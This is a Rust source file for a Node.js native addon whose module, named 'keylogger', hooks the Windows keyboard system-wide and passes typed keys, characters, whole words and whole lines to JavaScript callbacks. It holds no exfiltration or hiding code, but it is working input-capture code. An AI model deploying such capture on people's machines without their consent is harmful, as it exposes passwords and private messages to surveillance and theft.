#[napi]
pub mod keylogger {
  use super::super::*;
  use napi::{
    threadsafe_function::{ThreadSafeCallContext, ThreadsafeFunctionCallMode},
    Error, JsFunction, Result, Status,
  };
  use std::{collections::HashMap, str::FromStr, sync::Mutex};
  use windows_sys::Win32::UI::{Input::KeyboardAndMouse::*, WindowsAndMessaging::MAPVK_VK_TO_CHAR};

  #[napi(object)]
  pub struct Data {
    pub code: u32,
    pub alt: bool,
  }

  #[derive(Hash, Eq, PartialEq)]
  #[repr(u8)]
  enum ListenerKind {
    Key,
    Char,
    Word,
    Line,
  }

  impl FromStr for ListenerKind {
    type Err = Error;

    fn from_str(s: &str) -> Result<Self> {
      match s {
        "key" => Ok(Self::Key),
        "char" => Ok(Self::Char),
        "word" => Ok(Self::Word),
        "line" => Ok(Self::Line),
        _ => Err(Error::new(
          Status::InvalidArg,
          String::from("Invalid listener type. Accepted types: 'key', 'char', 'word', 'line'"),
        )),
      }
    }
  }

  enum Key {
    Special(&'static str),
    Char(char),
  }

  impl Key {
    unsafe fn new(data: *mut KEYBOARD_DATA) -> Option<Self> {
      match (*data).dwCode as u16 {
        VK_MENU | VK_LMENU | VK_RMENU => Some(Key::Special("Alt")),
        VK_LWIN | VK_RWIN => Some(Key::Special("Win")),
        VK_BACK => Some(Key::Special("Backspace")),
        VK_RETURN => Some(Key::Char('\n')),
        VK_SPACE => Some(Key::Char(' ')),
        VK_TAB => Some(Key::Char('\t')),
        VK_SHIFT | VK_LSHIFT | VK_RSHIFT => Some(Key::Special("Shift")),
        VK_CONTROL | VK_LCONTROL | VK_RCONTROL => Some(Key::Special("Control")),
        VK_ESCAPE => Some(Key::Special("Escape")),
        VK_END => Some(Key::Special("End")),
        VK_HOME => Some(Key::Special("Home")),
        VK_LEFT => Some(Key::Special("ArrowLeft")),
        VK_UP => Some(Key::Special("ArrowUp")),
        VK_RIGHT => Some(Key::Special("ArrowRight")),
        VK_DOWN => Some(Key::Special("ArrowDown")),
        VK_CAPITAL => Some(Key::Special("CapsLock")),
        VK_PRIOR => Some(Key::Special("PageUp")),
        VK_NEXT => Some(Key::Special("PageDown")),
        VK_DELETE => Some(Key::Special("Delete")),
        VK_INSERT => Some(Key::Special("Insert")),
        VK_SNAPSHOT => Some(Key::Special("PrintScreen")),
        190 | 110 => Some(Key::Char('.')),
        189 | 109 => Some(Key::Char('-')),
        _ => {
          let c = MapVirtualKeyW((*data).dwCode, MAPVK_VK_TO_CHAR);

          if c == 0 {
            None
          } else {
            Some(Key::Char(char::from_u32(c)?))
          }
        }
      }
    }
  }

  enum JsKey {
    Special(&'static str),
    Text(String),
  }

  struct LocalContext {
    callbacks: HashMap<ListenerKind, Vec<ThreadsafeFunction<JsKey, ErrorStrategy::Fatal>>>,
    mutex: Mutex<()>,
    word: Option<String>,
    line: Option<String>,
  }

  impl LocalContext {
    #[inline(always)]
    fn contains_callbacks(&self) -> bool {
      self.callbacks.len() > 0
    }

    fn insert(
      &mut self,
      kind: ListenerKind,
      data: ThreadsafeFunction<JsKey, ErrorStrategy::Fatal>,
    ) {
      if kind == ListenerKind::Word && self.word.is_none() {
        self.word.replace(String::new());
      }

      if kind == ListenerKind::Line && self.line.is_none() {
        self.line.replace(String::new());
      }

      if self.callbacks.contains_key(&kind) {
        let vec = unsafe { self.callbacks.get_mut(&kind).unwrap_unchecked() };

        vec.push(data);
      } else {
        self.callbacks.insert(kind, vec![data]);
      }
    }
  }

  impl Context for LocalContext {
    type Data = KEYBOARD_DATA;

    #[inline(always)]
    fn new() -> Self {
      Self {
        callbacks: HashMap::new(),
        mutex: Mutex::new(()),
        word: None,
        line: None,
      }
    }

    #[inline(always)]
    unsafe fn valid(this: *mut Self, data: *mut Self::Data) -> bool {
      match Key::new(data) {
        Some(key) => {
          let _ = (*this).mutex.lock().unwrap();

          if ((*data).dwCode as u16) == VK_BACK {
            if let Some(ref mut word) = (*this).word {
              if word.len() > 0 {
                word.pop();
              }
            }

            if let Some(ref mut line) = (*this).line {
              if line.len() > 0 {
                line.pop();
              }
            }
          }

          match key {
            Key::Special(_) => (*this).callbacks.contains_key(&ListenerKind::Key),
            Key::Char(c) => {
              let mut found = false;

              if let Some(ref mut line) = (*this).line {
                if line.len() > 0 && c == '\n' {
                  found = true;
                } else if c != '\n' {
                  line.push(c);
                }
              }

              if let Some(ref mut word) = (*this).word {
                let is_whitespace = c.is_whitespace();

                if word.len() > 0 && is_whitespace {
                  found = true;
                } else if !is_whitespace {
                  word.push(c);
                }
              }

              found || (*this).callbacks.contains_key(&ListenerKind::Char)
            }
          }
        }
        None => false,
      }
    }

    #[inline(always)]
    unsafe fn callback(this: *mut Self, data: *mut Self::Data) {
      let k = Key::new(data).unwrap_unchecked();

      match k {
        Key::Special(s) => {
          for cb in (*this)
            .callbacks
            .get(&ListenerKind::Key)
            .unwrap_unchecked()
            .iter()
          {
            cb.call(JsKey::Special(s), ThreadsafeFunctionCallMode::Blocking);
          }
        }

        Key::Char(c) => {
          let _ = (*this).mutex.lock().unwrap();

          if c == '\n' {
            if let Some(ref mut line) = (*this).line {
              if line.len() > 0 {
                for cb in (*this)
                  .callbacks
                  .get(&ListenerKind::Line)
                  .unwrap_unchecked()
                  .iter()
                {
                  cb.call(
                    JsKey::Text(line.clone()),
                    ThreadsafeFunctionCallMode::Blocking,
                  );
                }

                line.clear();
              }
            }
          }

          if c.is_whitespace() {
            if let Some(ref mut word) = (*this).word {
              if word.len() > 0 {
                for cb in (*this)
                  .callbacks
                  .get(&ListenerKind::Word)
                  .unwrap_unchecked()
                  .iter()
                {
                  cb.call(
                    JsKey::Text(word.clone()),
                    ThreadsafeFunctionCallMode::Blocking,
                  );
                }

                word.clear();
              }
            }
          }

          if let Some(ref it) = (*this).callbacks.get(&ListenerKind::Char) {
            let s = String::from(c);

            for cb in it.iter() {
              cb.call(JsKey::Text(s.clone()), ThreadsafeFunctionCallMode::Blocking);
            }
          }
        }
      }
    }
  }

  #[napi]
  pub unsafe fn on(typ: String, callback: JsFunction) -> Result<()> {
    let data = get_context::<LocalContext>(KeyboardHookData())?;
    let kind = typ.parse()?;
    let tsfn = callback.create_threadsafe_function(0, |ctx: ThreadSafeCallContext<JsKey>| {
      Ok(vec![match ctx.value {
        JsKey::Special(s) => ctx.env.create_string(s)?,
        JsKey::Text(s) => ctx.env.create_string_from_std(s)?,
      }])
    })?;

    (*data).insert(kind, tsfn);

    Ok(())
  }

  #[napi]
  pub unsafe fn start() -> Result<()> {
    let data = get_context::<LocalContext>(KeyboardHookData())?;

    if !(*data).contains_callbacks() {
      return Err(Error::new(
        Status::InvalidArg,
        String::from("The hook contains no callbacks as of now."),
      ));
    }

    KeyboardHookStart(
      Some(callback::<LocalContext>),
      Some(async_callback::<LocalContext>),
      Some(cleanup_callback::<LocalContext>),
    );

    Ok(())
  }

  #[napi]
  pub unsafe fn stop() {
    KeyboardHookStop();
  }
}
